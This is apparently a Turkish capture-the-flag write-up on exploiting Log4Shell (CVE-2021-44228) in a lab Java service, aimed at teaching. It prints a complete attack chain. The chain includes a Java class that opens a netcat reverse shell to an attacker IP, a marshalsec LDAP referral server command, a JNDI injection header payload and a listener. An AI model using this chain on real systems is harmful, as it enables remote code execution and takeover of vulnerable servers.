
**Zafiyetin Tanımı ve Kategorisi**

CTF'de istismar edilen zafiyetin adı **Log4Shell** olup, **CVE-2021-44228** kodu ile tanımlanmıştır. Bu zafiyetin kategorisi **Uzak Kod Çalıştırma (RCE)**'dır. Zafiyet, uygulamanın girdi verilerini loglarken **Log4j kütüphanesini kullanması**, **JNDI (Java Naming and Directory Interface) üzerinden uzak LDAP sunucularına bağlantı sağlanabilmesi** ve bu LDAP sunucularının hedef sistemde kod yürütülmesine yol açacak öğeleri sunabilmesi durumlarında ortaya çıkmaktadır. Özellikle HTTP header bilgileri (örneğin, `X-Api-Version`) üzerinden bu zafiyet tetiklenebilmektedir.

**Saldırı Aşamaları**

CTF senaryosunda gerçekleştirilen saldırı aşağıdaki aşamaları içermektedir:

1. **Endpoint Keşfi:** `ffuf` aracı kullanılarak hedef uygulamadaki `/api` ve `/systeminfo` endpoint'leri tespit edilmiştir. `/systeminfo` endpoint'i sistem hakkında bilgi verirken, `/api` endpoint'inin `X-Api-Version` header'ına duyarlı olduğu belirlenmiştir.
2. **Log4j Versiyonunun Tespiti:** Hedef sistemde **Log4j 2.6.1** sürümünün kullanıldığı tespit edilmiştir. Bu sürümün JNDI Injection zafiyetine karşı savunmasız olduğu belirlenmiştir.
3. **Exploit Sınıfının Hazırlanması:** `Exploit.java` adlı bir Java sınıfı hazırlanmıştır. Bu sınıf, çalıştırıldığında hedef sistemde bir reverse shell bağlantısı kurmayı amaçlamaktadır. Sınıfın içeriği aşağıdaki gibidir:
    
    ```
    import java.io.IOException;
    public class Exploit {
        static {
            try {
                String[] cmd = { "/bin/sh", "-c", "nc 192.168.144.1 6000 -e /bin/sh" };
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
    ```
    
    Bu sınıf `javac` komutu ile derlenerek `Exploit.class` dosyası oluşturulmuştur. Kaynaklardan birinde, Docker ortamında `bash` yerine `sh` komutunun çalıştığına dair bir not bulunmaktadır.
4. **HTTP Sunucusu Kurulumu:** Oluşturulan `Exploit.class` dosyasını sunmak için Python'un basit HTTP sunucusu kullanılmıştır:
    
    ```
    python -m http.server 9999
    ```
    
    Farklı kaynaklarda farklı port numaraları (9999 ve 1112) kullanıldığı görülmektedir.
5. **LDAP Sunucusu Kurulumu (Marshalsec):** Hedef sisteme zararlı kodu enjekte etmek için `marshalsec` aracı kullanılarak bir LDAP sunucusu kurulmuştur. LDAP sunucusu, hedef sistemden bir istek geldiğinde, HTTP sunucusundan `Exploit.class` dosyasını indirip çalıştırmak üzere yapılandırılmıştır. Komut örneği şöyledir:
    
    ```
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.245.59:9999/#Exploit"
    ```
    
    Farklı kaynaklarda sunucu IP adresleri ve `marshalsec` versiyonu farklılık gösterebilir. LDAP sunucusu genellikle 1389 portunda çalışmaya başlar.
6. **Payload Gönderimi:** `Postman` gibi bir araç kullanılarak hedef sisteme özel bir HTTP isteği gönderilmiştir. `X-Api-Version` header'ına Log4Shell zafiyetini tetikleyecek JNDI payload'u yerleştirilmiştir:
    
    ```
    GET /api HTTP/1.1
    Host: localhost:8080
    X-Api-Version: ${jndi:ldap://192.168.245.57:1389/Exploit}
    ```
    
    Bu istek, hedef sistemin belirtilen LDAP sunucusuna bağlanmasını sağlamıştır.
7. **Reverse Shell Dinleme:** Saldırgan makinede `netcat` (nc) aracı ile 6000 portunda bir dinleyici başlatılmıştır:
    
    ```
    nc -lvp 6000
    ```
    
    Başarılı bir saldırı sonucunda, hedef sistemden gelen bağlantı kabul edilmiş ve saldırgan sistem üzerinde bir shell erişimi elde etmiştir. Bu sayede hedef sistemde komut çalıştırma ve sistem kontrolü mümkün hale gelmiştir.

**Kullanılan Araçlar ve Komutlar**

Saldırı sırasında kullanılan temel araçlar ve komutlar şunlardır:

- `ffuf`: Endpoint fuzzing için kullanılmıştır.
- `marshalsec`: Kötü niyetli LDAP sunucusu kurmak için kullanılmıştır.
- `python3 -m http.server`: `Exploit.class` dosyasını paylaşmak için basit bir HTTP sunucusu başlatmak için kullanılmıştır.
- `javac`: Java exploit kodunu derlemek için kullanılmıştır.
- `netcat (nc)`: Hedef sistemden gelen reverse shell bağlantısını dinlemek için kullanılmıştır.
- `Postman`: HTTP isteklerini manuel olarak tetiklemek için kullanılmıştır.
- `git`, `mvn`: `marshalsec` aracını kurmak ve derlemek için kullanılan komutlardır.

**Sonuç**

Bu CTF senaryosu, **Log4Shell (CVE-2021-44228)** zafiyetinin gerçek dünya benzeri bir ortamda nasıl istismar edilebileceğini göstermektedir. Zafiyetli bir Log4j sürümünün, kötü niyetli LDAP ve HTTP sunucularıyla birlikte kullanılmasıyla, hedef sistem üzerinde tam yetkili uzaktan kod çalıştırma (reverse shell) erişimi elde edilebilmiştir. Bu durum, yazılım geliştirme süreçlerinde kullanılan kütüphanelerin güvenlik açıklarına karşı ne kadar dikkatli olunması gerektiğini ve güvenlik güncellemelerinin zamanında yapılmasının önemini vurgulamaktadır. Bir kaynakta, bu tür bir laboratuvarı Windows üzerinde çözerken virüs korumasının kapatılması gerekebileceği belirtilmektedir.